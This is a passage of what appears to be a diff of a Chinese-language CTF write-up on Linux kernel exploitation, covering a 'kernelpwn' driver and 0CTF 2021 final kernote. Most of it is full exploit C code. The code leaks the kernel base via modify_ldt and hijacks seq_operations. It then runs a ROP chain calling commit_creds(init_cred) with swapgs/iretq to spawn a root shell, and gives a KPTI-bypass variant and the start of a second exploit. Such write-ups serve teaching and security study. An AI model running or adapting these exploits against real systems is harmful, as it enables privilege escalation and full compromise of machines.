class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">long</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">delete_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">char</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> *tmp[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&quot;\0&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x20</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    create(<span class="number">0x10</span>, buf);</span><br><span class="line">    create(<span class="number">0x20</span>, buf);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">0</span>);</span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">        <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr += <span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search_addr += <span class="number">0x1000</span>;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> xchg_eax_esp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs;</span><br><span class="line"></span><br><span class="line">    swapgs = <span class="number">0xbc889f</span> + kernel_base;</span><br><span class="line">    iretq = <span class="number">0x2df</span> + kernel_base;</span><br><span class="line">    xchg_eax_esp = <span class="number">0xffffffff810e5bb9</span> + kernel_offset;</span><br><span class="line">    pop_rdi = <span class="number">0xffffffff8108c420</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xc9540</span> + kernel_base;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xc99d0</span> + kernel_base;</span><br><span class="line">    init_cred = <span class="number">0x1a6b700</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_stack = mmap(xchg_eax_esp &amp; <span class="number">0xfffff000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack: 0x%llx\n&quot;</span>, fake_stack);</span><br><span class="line">    fake_stack = xchg_eax_esp &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack: 0x%llx\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = xchg_eax_esp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_seq_struct[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_seq_struct[<span class="number">0</span>] = xchg_eax_esp;</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, fake_seq_struct);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    fake_stack[i++] = pop_rdi;</span><br><span class="line">    fake_stack[i++] = init_cred;</span><br><span class="line">    fake_stack[i++] = commit_creds;</span><br><span class="line">    fake_stack[i++] = swapgs;</span><br><span class="line">    fake_stack[i++] = iretq;</span><br><span class="line">    fake_stack[i++] = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    fake_stack[i++] = user_cs;</span><br><span class="line">    fake_stack[i++] = user_rflags;</span><br><span class="line">    fake_stack[i++] = user_sp;</span><br><span class="line">    fake_stack[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    read(seq_fd, <span class="number">0x1234</span>, <span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到我们使用的gadget只有32位，并且rax指向的还是这个gadget的地址，所以这里调用mmap的方式就按照exp中的即可</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220814114004277.png"
-                      alt="image-20220814114004277"
-                ></p>
+<p><img   src="/images/image-20220814114004277.png"  alt="image-20220814114004277"></p>
 <p>如果这里使用第二种绕过kpti的话可以payload换成</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> chang_cr3 = <span class="number">0xffffffff81c00feb</span> + kernel_offset;</span><br><span class="line">fake_stack[i++] = pop_rdi;</span><br><span class="line">fake_stack[i++] = init_cred;</span><br><span class="line">fake_stack[i++] = commit_creds;</span><br><span class="line">fake_stack[i++] = chang_cr3;</span><br><span class="line">fake_stack[i++] = swapgs;</span><br><span class="line">fake_stack[i++] = iretq;</span><br><span class="line">fake_stack[i++] = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">fake_stack[i++] = user_cs;</span><br><span class="line">fake_stack[i++] = user_rflags;</span><br><span class="line">fake_stack[i++] = user_sp;</span><br><span class="line">fake_stack[i++] = user_ss;</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220814123321832.png"
-                      alt="image-20220814123321832"
-                ></p>
+<p><img   src="/images/image-20220814123321832.png"  alt="image-20220814123321832"></p>
 <h3 id="0CTF-2021-final-kernote"><a href="#0CTF-2021-final-kernote" class="headerlink" title="0CTF 2021 final kernote"></a>0CTF 2021 final kernote</h3><p>题目基本和上面一道题一致，不过这里的文件系统采用的ext4，需要拿到内部文件的方法就是</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs.img ./rootfs</span><br><span class="line">......</span><br><span class="line">sudo umount ./rootfs</span><br></pre></td></tr></table></figure>
 
@@ -345,14 +407,9 @@
 <h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a><strong>利用分析</strong></h4><p>相信提到这里就很清楚思路跟上面那道题基本是一致的了，因为最小size是32那也就决定了ldt_struct和seq_operations申请的size也都是32。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        addr += <span class="number">0x40000000</span>;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里是单纯使用上一道题目方法的代码<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220814142800527.png"
-                      alt="image-20220814142800527"
-                ></p>
+<p>这里是单纯使用上一道题目方法的代码<img   src="/images/image-20220814142800527.png"  alt="image-20220814142800527"></p>
 <p>可以看到在下面搜索基地址，会直接崩溃掉，这是因为触发了Hardened Usercopy保护。在fork的系统调用中存在一条调用链：</p>
-<p><code>sys_fork()</code>=&gt;<code>kernel_clone()</code>=&gt;<code>copy_process()</code>=&gt;<code>copy_mm()</code>=&gt;<code>dup_mm()</code>=&gt;<code>dup_mmap()</code>=&gt;<code>arch_dup_mmap()</code>=&gt;<code>ldt_dup_context()</code></p>
+<p><code>sys_fork()</code>&#x3D;&gt;<code>kernel_clone()</code>&#x3D;&gt;<code>copy_process()</code>&#x3D;&gt;<code>copy_mm()</code>&#x3D;&gt;<code>dup_mm()</code>&#x3D;&gt;<code>dup_mmap()</code>&#x3D;&gt;<code>arch_dup_mmap()</code>&#x3D;&gt;<code>ldt_dup_context()</code></p>
 <p>最后的ldt_dup_context函数如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!old_mm)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">    <span class="keyword">if</span> (!old_mm-&gt;context.ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt) &#123;</span><br><span class="line">        retval = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">    finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">    retval = map_ldt_struct(mm, new_ldt, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval) &#123;</span><br><span class="line">        free_ldt_pgtables(mm);</span><br><span class="line">        free_ldt_struct(new_ldt);</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line">    mm-&gt;context.ldt = new_ldt;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    mutex_unlock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -366,216 +423,306 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure>
 
 <p>这条指令会将所有寄存器压入进内核的栈中，形成一个pt_reg结构体：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/NwjgEMse8cTCdLr.png"
-                      alt="image-20220814123321832"
-                ></p>
+<p><img   src="/images/NwjgEMse8cTCdLr.png"  alt="image-20220814123321832"></p>
 <p>当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 rsp 与 栈底的相对偏移通常是不变的，而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们布置 ROP 链提供了可能。</p>
 <h4 id="综上，得出exp-1"><a href="#综上，得出exp-1" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 